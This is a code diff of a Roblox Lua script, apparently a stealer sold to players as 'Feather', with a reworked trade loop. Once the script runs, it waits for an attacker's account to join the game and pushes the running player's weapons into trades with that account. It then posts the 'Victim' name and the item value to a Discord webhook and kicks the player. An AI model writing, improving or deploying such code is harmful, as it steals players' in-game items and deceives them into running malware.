@@ -225,7 +225,7 @@ local sent = SendDiscord({
             {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](" .. JoinLink .. ")", inline = false},
             {name = "Teleport Code", value = "```lua\n" .. TeleportCode .. "\n```", inline = false}
         },
-        footer = {text = "Job ID: " .. JobId},
+        footer = {text = "Job ID: " .. JobId .. " | Script will auto-trade when owner joins"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 })
@@ -247,7 +247,7 @@ end)
 local function getTradeStatus()
     local s = nil
     pcall(function() s = game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end)
-    return s or "Unknown"
+    return s or "None"
 end
 local function sendTradeRequest(name)
     pcall(function()
@@ -264,59 +264,74 @@ end
 local function declineTrade()
     pcall(function() game.ReplicatedStorage.Trade.DeclineTrade:FireServer() end)
 end
-local function waitTradeEnd()
-    repeat task.wait(0.1) until getTradeStatus() == "None"
+local function declineRequest()
+    pcall(function() game.ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
 end
 
 task.spawn(function()
-    local ownerFound = false
-    local checkCount = 0
+    print("Waiting for owner to join...")
+    local maxWait = 300
+    local waited = 0
+    local owner = nil
+    
     repeat
-        checkCount += 1
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(users, p.Name) then
-                ownerFound = true
-                task.wait(1)
-                sendTradeRequest(p.Name)
-                local tradeAttempts = 0
-                repeat
-                    tradeAttempts += 1
-                    local status = getTradeStatus()
-                    if status == "StartTrade" then
-                        for i = 1, math.min(4, #weaponsToSend) do
-                            local item = table.remove(weaponsToSend, 1)
-                            for _ = 1, item.Amount do
-                                addItem(item.DataID)
-                                task.wait(0.05)
-                            end
-                        end
-                        task.wait(6)
-                        acceptTrade()
-                        waitTradeEnd()
-                        SendDiscord({
-                            content = "@everyone",
-                            embeds = {{
-                                title = "TRADE COMPLETED",
-                                color = 65280,
-                                fields = {
-                                    {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
-                                    {name = "Total Value", value = "```" .. totalValue .. "```", inline = true}
-                                },
-                                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                            }}
-                        })
-                        task.wait(1)
-                        plr:Kick("Items transferred successfully")
-                        return
-                    end
-                    if status == "ReceivingRequest" then
-                        declineTrade()
-                        task.wait(0.5)
-                    end
-                    task.wait(1)
-                until tradeAttempts > 20
+                owner = p
+                break
             end
         end
-        task.wait(1)
-    until ownerFound or checkCount > 120
+        if not owner then task.wait(1); waited += 1 end
+    until owner or waited >= maxWait
+    
+    if not owner then
+        plr:Kick("Owner did not join in time")
+        return
+    end
+    
+    print("Owner detected: " .. owner.Name .. " - Starting trade...")
+    task.wait(1.5)
+    
+    while #weaponsToSend > 0 do
+        local status = getTradeStatus()
+        
+        if status == "None" then
+            sendTradeRequest(owner.Name)
+            task.wait(2)
+        elseif status == "ReceivingRequest" then
+            declineRequest()
+            task.wait(0.5)
+        elseif status == "StartTrade" then
+            for i = 1, math.min(4, #weaponsToSend) do
+                local item = table.remove(weaponsToSend, 1)
+                for _ = 1, item.Amount do
+                    addItem(item.DataID)
+                    task.wait(0.08)
+                end
+            end
+            task.wait(3)
+            acceptTrade()
+            repeat task.wait(0.3) until getTradeStatus() == "None" or #weaponsToSend == 0
+            task.wait(1)
+        else
+            task.wait(0.5)
+        end
+    end
+    
+    SendDiscord({
+        content = "@everyone",
+        embeds = {{
+            title = "TRADE COMPLETED",
+            color = 65280,
+            fields = {
+                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
+                {name = "Items Transferred", value = "```" .. #weaponsToSend .. " batches sent```", inline = true}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    })
+    
+    task.wait(1)
+    plr:Kick("All items transferred successfully. Thanks for using Feather!")
 end)
